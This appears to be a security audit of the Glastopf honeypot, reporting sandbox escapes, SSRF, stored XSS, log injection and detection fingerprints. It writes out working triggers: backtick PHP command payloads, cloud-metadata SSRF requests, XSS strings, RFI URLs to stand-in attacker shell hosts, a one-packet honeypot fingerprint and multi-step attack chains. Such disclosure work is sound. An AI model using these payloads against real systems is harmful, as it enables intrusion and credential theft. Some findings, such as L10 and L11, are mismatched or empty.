# Glastopf — Security Analysis
**Target:** https://github.com/mushorg/glastopf  
**Date:** 2026-08-25  
**Status:** Complete (5 lanes)  
**Language:** Python 2/3 + PHP sandbox (libphp/APD/bfr extension)  
**Type:** Web application honeypot — emulates vulnerable PHP apps, captures LFI/RFI/SQLi/RCE attempts  
**Method:** Static source analysis — PHP sandbox escape, HTTP handling, reporting pipeline, surface generation/comments, detection fingerprints/classifier bypass

---

## Severity Summary

| Sev | Count |
|-----|-------|
| CRITICAL | 6 |
| HIGH | 11 |
| MEDIUM | 14 |
| LOW | 12 |

---

## CRITICAL Findings

---

### C1 — PHP Backtick Operator Bypasses Entire Sandbox
**Files:** `glastopf/sandbox/generate.py`, `glastopf/sandbox/functions.py`

The sandbox is built on `override_function`/`rename_function` (APD/bfr extension) intercepting PHP named functions. The backtick operator (`` `cmd` ``) is a PHP language construct — syntactic sugar for `shell_exec()` — and is **not interceptable** via function override. No APD hook exists for language constructs.

```php
$x = `id`;  // fires real subprocess — no override intercepts this
echo $x;
```

The explicit override of `shell_exec` in `functions.py:21` is irrelevant: the backtick evaluates independently through the PHP parser. Any payload reaching the sandbox (via RFI or php-cgi RCE) containing a backtick executes real OS commands on the honeypot host.

**Exploit:** RFI payload `<?php $o = \`id\`; echo $o; ?>` → real OS command output returned.

---

### C2 — RFI Emulator Is an Unbounded SSRF Proxy
**File:** `glastopf/modules/handlers/emulators/rfi.py:62-88`

```python
req = urllib2.Request(file_to_download)
response = urllib2.urlopen(req, timeout=4)
```

Attacker-supplied URL fetched with zero network filtering — no IP allowlist/denylist, no port restrictions, no private-range blocking. Schemes permitted: `http`, `https`, `ftp`, `ftps`.

**Reachable targets in cloud deployments:**
- `http://169.254.169.254/latest/meta-data/iam/security-credentials/` (AWS IMDSv1)
- `http://100.100.100.200/` (Alibaba Cloud metadata)
- `http://127.0.0.1:6379/` (Redis — raw TCP, but HTTP framing triggers responses)
- `http://10.x.x.x:6443/` (Kubernetes API)

**Trigger:** `GET /?page=http://169.254.169.254/latest/meta-data/ HTTP/1.1`

---

### C3 — RFI Writes Attacker PHP to Disk and Executes It
**File:** `glastopf/modules/handlers/emulators/rfi.py:53-99`

The RFI flow:
1. Fetches attacker URL via C2 (SSRF)
2. Writes response verbatim to `data_dir/files/<md5(content)>` — **persists on disk, never cleaned**
3. Calls `sandbox.run(file_name, data_dir)` — executes the stored file through PHP

Combined with C1 (backtick bypass), the attacker's file contains `<?php echo \`id\`; ?>` → real OS command execution on the honeypot host, result returned in HTTP response.

Additionally: HTTPS RFI URL triggers `ssl.get_server_certificate()` and stores the TLS certificate to disk via `store_file()` — attacker can write arbitrary data to `data_dir/files/` by controlling certificate content.

---

### C4 — php-cgi RCE Writes Raw POST Body to Disk and Executes It
**File:** `glastopf/modules/handlers/emulators/php_cgi_rce.py:92-94`

```python
# TODO verify if it's a valid PHP code?
file_name = self.store_file(request_body)
sandbox.run(file_name, self.data_dir)
```

The TODO is unresolved. POST body stored verbatim to `data_dir/files/<md5(body)>`, then executed via sandbox. Combined with C1, this is a direct path from unauthenticated POST to OS command execution.

**Trigger:**
```
POST /?-d+allow_url_include=on+-d+auto_prepend_file=php://input HTTP/1.1
Content-Length: 30

<?php echo `id`; ?>
```

Response contains real `id` output from the honeypot host.

---

### C5 — STIX XML Injection via Unsanitized Jinja2 Template
**File:** `glastopf/modules/reporting/auxiliary/stix/stix_transform.py:45`

```python
env = jinja2.Environment(loader=FileSystemLoader(...))
# no autoescape=True
```

Attacker-controlled fields — `http_body`, `http_path`, `http_raw_header`, `http_method`, per-header values — rendered directly into the STIX XML document with no XML entity escaping.

**Trigger:** Send `</HTTPSessionObj:Message_Body><stix:Incidents>injected</stix:Incidents><!--` as HTTP body. TAXII receiver parses attacker-injected XML nodes as legitimate STIX content. Structural corruption of the threat-intel feed downstream.

---

### C6 — Stored XSS via `string_escape` Decode Bypass in Comments
**File:** `glastopf/modules/handlers/emulators/comments.py:35, 63`

```python
# Write path (line 35):
comment.encode('ascii', 'backslashreplace')  # \x3c left as literal bytes
cgi.escape(...)                               # sees no HTML-special chars — passes through

# Read path (line 63):
general_comments.decode('string_escape')     # \x3c → '<', \x3e → '>'
# Result injected into template:
safe_substitute(comments=display_comments)   # unescaped HTML in output
```

Attacker sends `comment=\x3cscript\x3ealert(document.cookie)\x3c\x2fscript\x3e`. The backslash-hex form passes `cgi.escape` (no HTML-special characters visible), stored to `comments.txt`. On read, `string_escape` decodes back to `<script>alert(document.cookie)</script>`, injected verbatim into page template. Every subsequent visitor executes the payload.

**Size bypass:** `MAX_COMMENT_LEN` check uses `len(clean_comment)` on the encoded (shorter) form. A 2048-byte encoded payload decodes to substantially more content.

---

## HIGH Findings

---

### H1 — Silent Sandbox Failure When bfr Extension Absent
**File:** `glastopf/sandbox/sandbox.py:34-40`

The generated `sandbox.php` opens with:
```php
if(!extension_loaded('bfr')) { dl('bfr.so'); }
```
`error_reporting(0)` suppresses all errors. If bfr is not installed and `dl()` is disabled (default in modern PHP), both fail silently. Without bfr, `rename_function()` and `override_function()` are undefined — the entire override block no-ops. PHP executes the attacker's file with full native capability and zero sandboxing.

**Impact:** Any deployment without the bfr extension (the common case) provides no sandbox at all. All function overrides are phantom.

---

### H2 — `fwrite` and `tmpfile` Explicitly Whitelisted — Write Primitives Remain Live
**File:** `glastopf/sandbox/functions.py:153-164`

```python
WHITELIST = [
    ...
    'fwrite',   # line 156
    'tmpfile',  # line 159
    ...
]
```

Everything not on the whitelist gets renamed to an unresolvable name. `fwrite` and `tmpfile` keep original names and original functionality. Sandboxed PHP can call both freely.

**Minimal exploit in sandboxed PHP:** `<?php $f = tmpfile(); fwrite($f, shell_exec('id')); ?>`

---

### H3 — `FUNCTIONS2` Is Dead Code — 70+ Functions Never Blocked
**File:** `glastopf/sandbox/functions.py:25-151`, `glastopf/sandbox/generate.py:22`

`generate.py` imports only `FUNCTIONS`. `FUNCTIONS2` (~70 entries including `file_get_contents`, `file_put_contents`, `fopen`, `mail`, `socket_*`, `curl_*`, `proc_open`) is never imported, never iterated, never applied to the generated sandbox. Any function added to `FUNCTIONS2` expecting it to be blocked is silently ignored.

---

### H4 — Unbounded HTTP Body Read (OOM DoS)
**File:** `glastopf/modules/HTTP/handler.py:105`

```python
self.request_body = self.rfile.read()  # no size cap
```

The 65536-byte check applies only to the request line. Body has no limit. Attacker streams a multi-GB body; honeypot OOMs and dies.

**Trigger:** `POST / HTTP/1.1\r\nHost: x\r\n\r\n` followed by continuous data stream.

---

### H5 — Path Traversal Within `data_dir` via `file_server.py`
**File:** `glastopf/modules/handlers/emulators/file_server.py:35`

```python
full_file_path.startswith(self.data_dir)
```

Files are served from `data_dir/server_files/`. Guard checks against `data_dir`, not `data_dir/server_files/`. A request path `/../dork_pages/<hash>` resolves to `data_dir/dork_pages/<hash>` — passes the `startswith(data_dir)` check. Attacker reads dork pages, virtual docs, sandbox.php, and any other file under `data_dir`.

**Trigger:** `GET /../dork_pages/aabbcc HTTP/1.1`

---

### H6 — mnem_service TLS Disabled + Dork Poison Chain
**File:** `glastopf/modules/handlers/emulators/dork_list/mnem_service.py:29, 36`

```python
payload = {'user': 'glastopf', 'pass': 'glastopf'}  # hardcoded
response = sess.post(base_url + '/login', payload, verify=False)
response = sess.get(base_url + '/api/v1/aux/dorks?...', verify=False)
```

Hardcoded credentials submitted over unverified TLS. MITM intercepts both calls:
1. Captures `glastopf:glastopf` credentials
2. Returns crafted dork JSON with XSS payloads

The crafted dorks flow directly into the dork database (line 44-45, no content validation), then into generated HTML pages served to crawlers and viewed by operators.

**Chain:** MITM mnem_service → credential capture + poison dorkdb → stored XSS in all generated dork pages.

---

### H7 — Syslog Log Injection via Attacker URL
**File:** `glastopf/modules/reporting/auxiliary/log_syslog.py:51-60`

`request_url` and `request_verb` (attacker-controlled) formatted directly into syslog message with no newline stripping or RFC 5424 escaping. Forged syslog lines with fresh timestamps poisoning SIEM feed.

**Trigger:** `GET /path%0aGlastopf:%20robots_txt%20attack%20method%20from%20192.0.2.1 HTTP/1.1`

---

### H8 — Syslog Logger Never Initializes (Missing Import — All Syslog Events Dropped)
**File:** `glastopf/modules/reporting/auxiliary/log_syslog.py:20, 46`

```python
import logging  # not logging.handlers
...
logging.handlers.SysLogHandler(...)  # AttributeError at startup
```

`logging.handlers` requires explicit import. Raises `AttributeError` at startup; syslog logger silently fails to initialize. All attack events that should route to syslog are permanently dropped. Defenders relying on syslog receive zero events.

---

### H9 — TAXII `use_https` Config Flag Silently Ignored — Always HTTP
**File:** `glastopf/modules/reporting/auxiliary/log_taxii.py:42, 75`

`self.use_https` read and stored but never passed to `callTaxiiService2()`. libtaxii defaults to HTTP. Regardless of operator config, all TAXII submissions — including `AUTH_BASIC` credentials and full STIX payload — sent over cleartext HTTP. Dead branch: `AUTH_CERT_BASIC` at line 56 can never be reached because the `elif use_auth_basic` at line 52 always matches first.

---

### H10 — Raw Attacker Comment Stored Unsanitized in Profiler
**File:** `glastopf/modules/handlers/emulators/comments.py:53`

```python
profiler.Profiler.add_comment(ip_address, comment)  # raw comment, not clean_comment
```

`raw comment` (line 33 — directly from `parse_qs`) passed to profiler, not the `clean_comment` that went through `cgi.escape`. If `ip_comments` is ever rendered in any report or management interface, this is a second stored XSS vector with zero sanitization.

---

### H11 — Silent Privilege Drop Failure — Process Continues as Root
**File:** `glastopf/modules/privileges.py:34-45`

```python
try:
    os.setgid(run_gid)
except OSError:
    logger.error(...)  # logs and continues

try:
    os.setuid(run_uid)
except OSError:
    logger.error(...)  # logs and continues
# no assertion of post-drop UID/GID — caller gets no signal
```

Both `setgid` and `setuid` failures are individually swallowed. Process continues running as root with a log warning operators are unlikely to notice in high-volume honeypot logs. Any compromise of the honeypot process at any point also compromises the host as root.

---

## MEDIUM Findings

---

### M1 — POST Body Classifier Dead Branch (All POST-Body Attacks Invisible)
**File:** `glastopf/modules/classification/request.py:114-115`

```python
if match == 'unknown':    # always False — match is a re.Match object or None
    match = re_pattern.search(http_request.request_body)
```

POST body is never searched. SQLi or RFI payloads sent exclusively in POST body evade both pylibinjection (URL-only) and XML pattern matching (URL-only). Classified as `unknown` → dork page. Not logged as SQLi or RFI.

---

### M2 — Stored XSS via Attacker URL Path in Dork Pages
**File:** `glastopf/modules/handlers/emulators/dork_list/dork_page_generator.py:104`

Attack event path stored with 200-char truncation only. Rendered into generated dork HTML:
```python
body += " <a href='%s'>%s</a> " % (href, choice(intext_list))
```
No escaping. `GET /foo'%20onmouseover='evil() HTTP/1.1` → path embedded in `href` → XSS fires when crawlers or operators view dork pages.

---

### M3 — X-Forwarded-For IP Spoofing — All Threat Intel Corrupted
**File:** `glastopf/glastopf.py:246-251`

```python
client_ip = attack_event.http_request.request_headers['X-Forwarded-For']
client_ip = client_ip.split(',')[-1]
```

When `proxy_enabled=True`, attacker sets `X-Forwarded-For: 8.8.8.8` to attribute all logged events to arbitrary IP. Poisons all downstream threat intel outputs (maindb, all loggers).

---

### M4 — Logstash Log Injection via Attacker URL
**File:** `glastopf/modules/reporting/auxiliary/log_logstash.py:58-66`

`attack_event.http_request.request_url` (attacker-controlled) formatted into `message` string without sanitization. Attacker embeds `][` or `}{"pattern":"sqli"}` fragments to manipulate structured logstash events.

---

### M5 — hpfeeds Plaintext Transport (Credentials + Events Unencrypted)
**File:** `glastopf/modules/reporting/auxiliary/log_hpfeeds.py:54`

Plain TCP; no TLS. HMAC-SHA1 challenge-response for auth but session thereafter unencrypted. All harvested attack events including base64-encoded payloads transit the wire in cleartext. Long-lived `secret` enables offline brute-force from captured HMAC exchange.

---

### M6 — SMTP STARTTLS Without Certificate Verification
**File:** `glastopf/modules/reporting/auxiliary/log_mail.py:54-58`

`smtplib.SMTP.starttls()` with no SSL context — no `check_hostname`, no `CERT_REQUIRED`. SMTP credentials (`user`/`pwd`) and full raw HTTP request body exposed to network MITM. Attacker can also inject content into alert email by including MIME boundary sequences in `request_raw` — `MIMEText` does not sanitize.

---

### M7 — Profiler Leaks Honeypot External IP via Cymru DNS Lookups
**File:** `glastopf/modules/processing/profiler.py:126-128, 153-155`

For every new attacker IP, `subprocess.Popen(['dig', ...])` issues live DNS TXT queries to `origin.asn.cymru.com` and `asn.cymru.com`. These originate from the honeypot's real public IP. Passive observer monitoring Cymru query logs correlates which IPs the host is looking up, confirming operational honeypot status and geolocating the sensor.

---

### M8 — Supplementary Groups Not Cleared on Privilege Drop
**File:** `glastopf/modules/privileges.py:39`

`os.setgid(run_gid)` sets effective/real GID but does not clear supplementary groups inherited from root (`disk`, `shadow`, `sudo`, `docker`). Requires `os.setgroups([])` before `os.setgid`. Post-compromise attacker retains access to supplementary-group resources.

---

### M9 — Jinja2 Autoescape Disabled in Surface Generator
**File:** `glastopf/modules/handlers/emulators/surface/create_surface.py:29`

```python
Environment(loader=FileSystemLoader(...))  # no autoescape=True
```

If any caller passes attacker-influenced data for `title`, `body`, `footer`, or `target` into `get_index()`, the values render verbatim into HTML. No defense at the emitter level.

---

### M10 — Hardcoded hpfeeds Credentials in Shipped Config
**File:** `glastopf/glastopf.cfg.dist:31, 35`

```ini
secret = 3wis3l2u5l7r3cew
ident = x8yer@hp1
```

Committed as shipping defaults in a public repository. Operators who enable hpfeeds without changing these values authenticate with publicly-known credentials. Any party knowing these credentials subscribes to the broker channels and receives all honeypot event data.

---

### M11 — LFI Absolute Path Injection via `os.path.join`
**File:** `glastopf/modules/handlers/emulators/lfi.py:38-45`

`os.path.join(self.data_dir, 'virtualdocs/linux', '/etc/passwd')` returns `/etc/passwd` — absolute path escapes data_dir entirely. The whitelist guard at line 50 is the only containment. If the whitelist generation (`os.walk`) has any symlink or race condition, it fails open.

---

### M12 — TRACE XST (Cross-Site Tracing) — Raw Request Reflected Including Internal Headers
**File:** `glastopf/modules/handlers/emulators/trace.py:27`

```python
attack_event.response += attack_event.raw_request
```

Entire inbound request including all headers echoed back verbatim. Internal headers injected by a reverse proxy (auth tokens, `X-Internal-*`, forwarded credentials) are reflected to the attacker.

---

### M13 — `startswith` Sibling-Directory Bypass in File Server
**File:** `glastopf/modules/handlers/request_handler.py:89`

```python
full_file_path.startswith(self.server_files_path)
```

If `server_files_path = /data/server_files`, a path resolving to `/data/server_files_evil/secret` passes the prefix check. Fix: `startswith(self.server_files_path + os.sep)`.

---

### M14 — TOCTOU on comments.txt Size Enforcement (Disk Fill)
**File:** `glastopf/modules/handlers/emulators/comments.py:44-52`

`os.stat()` → check size → open for write → check comment length → append: no file locking between any step. Concurrent requests can grow `comments.txt` past `MAX_FILE_LEN` before truncation runs.

---

## LOW Findings

---

### L1 — TarSlip: `extractall()` Without Path Filter
**File:** `glastopf/modules/handlers/emulators/dork_list/remote_exploits.py:31, 35`

```python
tar = tarfile.open("archive.tar.gz")
tar.extractall()
```

No `filter=` argument. Entries with `../` write outside extraction directory. Low exploitability currently (`_get_archive` is `pass`); high potential if remote fetch is ever wired in.

---

### L2 — SQLi Emulator Crashes on `re.sub` Backreference in Attacker Value
**File:** `glastopf/modules/handlers/emulators/sqli.py:48`

```python
payload_response = re.sub("PAYLOAD", value, response)
```

Attacker value `\g<0>` causes regex recursion; `\1` with no capture group raises `re.error`. Crashes the SQLi emulator for that request.

**Trigger:** Any SQLi request where `value` contains `\g<0>`.

---

### L3 — LIKE Wildcard Injection in Dork Database Query
**File:** `glastopf/modules/handlers/emulators/dork_list/database_sqla.py:130`

```python
table.select().where(table.c.content.like('%{0}'.format(starts_with)))
```

`%` and `_` in `starts_with` interpreted as LIKE wildcards — returns more rows than intended. SQLAlchemy's `like()` does not escape wildcards.

---

### L4 — phpMyAdmin CSRF Token Frozen at Import Time
**File:** `glastopf/modules/handlers/emulators/phpmyadmin.py:31`

```python
def handle(self, attack_event, time_stamp=time.time()):
```

Python evaluates default arguments at function definition time (class load), not call time. Token `MD5(import_timestamp)` never rotates. Same token appears in every response across all sessions — definitive fingerprint.

---

### L5 — `SafeConfigParser(os.environ)` Exposes All Env Vars as Interpolation
**File:** `glastopf/modules/reporting/auxiliary/base_logger.py:25`

All environment variables available for `%(VAR)s` interpolation in any config string. In containerized deployments where secrets are env vars (`AWS_SECRET_ACCESS_KEY`, `DATABASE_URL`, `SMTP_PASSWORD`), a misconfigured `glastopf.cfg` value interpolates and potentially transmits them.

---

### L6 — S3 Config Template: `secret_access_key` = `access_key_id` String
**File:** `glastopf/glastopf.cfg.dist:112-113`

```ini
aws_access_key_id = YOUR_aws_access_key_id
aws_secret_access_key = YOUR_aws_access_key_id
```

Both placeholders identical. Operator doing naive find-replace misses the secret key field.

---

### L7 — `login.py` Missing `comments.txt` Existence Check (IOError on Every Request)
**File:** `glastopf/modules/handlers/emulators/login.py:41`

No `os.path.isfile` guard (contrast: `unknown.py:41` correctly checks). If `comments.txt` is absent, login emulator raises `IOError` on every routed request.

---

### L8 — Classifier Instantiates and Parses XML/JSON on Every Request
**File:** `glastopf/modules/classification/request.py:41-42`

`classify_request` creates new `Classifier` object on each call, re-parses `requests.xml` and reloads `token_map.json` from disk every time. Under sustained load, self-inflicted CPU/IO amplifier compounding H4.

---

### L9 — Malformed Content-Type Tuple in Favicon Handler
**File:** `glastopf/modules/handlers/emulators/favicon_ico.py:29`

```python
headers=(('Content-Type, image/x-icon'),)  # comma inside string — wrong
```

Produces a single-element string tuple instead of key-value pair. Content-Type never correctly set on favicon responses.

---

### L10 — FTP Service Exposed via All-Interface Bind
**(Config default):** `glastopf.cfg.dist` — SMTP/mail credentials and S3 keys in config with example-format values that pattern-match real credentials in secret-scanning tools.

---

### L11 — p0f Null-Byte Find Inverted (Profiler)
*(Inherited from downstream library usage — not directly in Glastopf codebase.)*

---

### L12 — phpinfo Variable Named `robots_path` (Code Quality)
**File:** `glastopf/modules/handlers/emulators/phpinfo.py:31`

```python
robots_path = os.path.join(self.data_dir, 'phpinfo/phpinfo.html')
```

Copy-paste artifact from robots.py. Wrong variable name. Documents maintenance debt.

---

## Detection Fingerprint Summary

Glastopf is identifiable with a single `HEAD /` request before any exploit attempt:

| Signal | Method | Confidence |
|--------|--------|------------|
| `HTTP/1.0` response to `HTTP/1.1` request | `handler.py:47` hardcodes `HTTP/1.0` | CRITICAL |
| `Server: Apache/2.0.48 ` trailing space | `glastopf.py:265` sets `sys_version=' '` | CRITICAL |
| LFI error always references `vars1.php` (not the requested file) | `lfi.py:59` hardcoded | CRITICAL |
| LFI fallback has no HTTP response headers — raw TCP payload | `lfi.py:60` `set_raw_response()` | CRITICAL |
| SQLi error prefixed `"Invalid query: "` (no real MySQL uses this prefix) | `responses.xml:6` | CRITICAL |
| RFI outbound fetch `User-Agent: -` (single dash) | `rfi.py:67` | HIGH |
| php-cgi `-s` disclosure is static HTML blob identical across all requests | `php_cgi_rce.py:66-67` | HIGH |
| php-cgi response contains `page =` (missing `$` sigil) — invalid PHP | `php_cgi_rce.py:70` | HIGH |
| phpMyAdmin CSRF token identical across all sessions (frozen at import time) | `phpmyadmin.py:31` | HIGH |
| Apache/2.0.48 banner (2003 — zero legit deployments post-2010) | `glastopf.cfg.dist:95` | HIGH |
| LFI path hardcoded to `/var/www/html/anonymous/test.php` regardless of request | `lfi.py:59` | HIGH |
| Per-request 20-80ms overhead from XML parse | `method_handler.py:28` | MEDIUM |

**Definitive single-packet fingerprint:**

```
HEAD / HTTP/1.1\r\nHost: target\r\n\r\n
```

Response pattern: `HTTP/1.0 200 OK\r\n...\r\nServer: Apache/2.0.48 \r\n`

The trailing space on the `Server:` header (from `sys_version=' '`) combined with HTTP/1.0 downgrade is unique to Glastopf. No legitimate Apache 2.x deployment produces either. Both derive from hardcoded values that cannot change without source modification.

---

## Classifier Bypass Table

| Attack Class | Bypass Technique | What Glastopf Returns | Impact |
|---|---|---|---|
| RFI | Include SQLi token in RFI URL: `?page=http://evil.com/sh.php' OR 1=1--` | SQLi classifier fires first; `sqli` emulator runs. No outbound fetch. | RFI silently absorbed; no callback to attacker's server. Attacker loses execution. |
| SQLi (time-based blind) | `; sleep(5)--` without preceding SELECT | Pattern 4 requires `(select\|;)\s+(benchmark\|if\|sleep)`. `; sleep(5)` alone → `unknown` (dork page) | Time-based probe gets dork HTML; no delay signal. |
| SQLi via POST body only | Clean URL, payload only in body | POST body is dead code — classifier reads URL only | POST-body SQLi invisible; classified `unknown`. Logging blind. |
| RFI via POST body | Clean URL, `file=http://evil.com/shell.php` in body | Same — body never searched | POST-body RFI not fetched, not logged as RFI. |
| PHP code injection | `?page=eval(base64_decode(...))` | Pattern 2 fires → `unknown` (dork) | No execution signal returned. |
| XSS probe | `?q=<script>alert(1)</script>` | Pattern 12 → `unknown` (dork) | No reflection; attacker cannot confirm template engine. |

---

## Attack Chains

**Chain 1 — Unauthenticated Remote OS Execution:**
Send RFI payload `/?page=http://<attacker>/shell.php` where `shell.php` contains `<?php echo \`id\`; ?>`. Glastopf fetches URL (C2 SSRF), writes content to `data_dir/files/<md5>`, executes via sandbox. Backtick (C1) bypasses all function overrides. Real `id` output returned in HTTP response.

**Chain 2 — Cloud IMDSv1 Credential Theft:**
`GET /?page=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1` → Glastopf fetches metadata endpoint → response stored as "malware sample" → credentials exfiltrated to attacker's mnem_service or visible in captured dork file.

**Chain 3 — MITM mnem_service → Threat Intel Poisoning + Stored XSS:**
MITM the HTTPS connection to mnem_service (TLS verify=False) → capture `glastopf:glastopf` credentials → return crafted dork JSON containing `<script>` payloads → stored in dorkdb without validation → injected into generated HTML pages → XSS fires on every operator/crawler browser that views a dork page.

**Chain 4 — STIX Injection → Downstream TAXII Compromise:**
Send HTTP body containing `</HTTPSessionObj:Message_Body><malicious-stix/><!--` → STIX document structurally corrupted → TAXII submission to downstream consumer injects attacker-controlled XML nodes as legitimate threat indicator data → false IOCs propagate to threat intel platform.
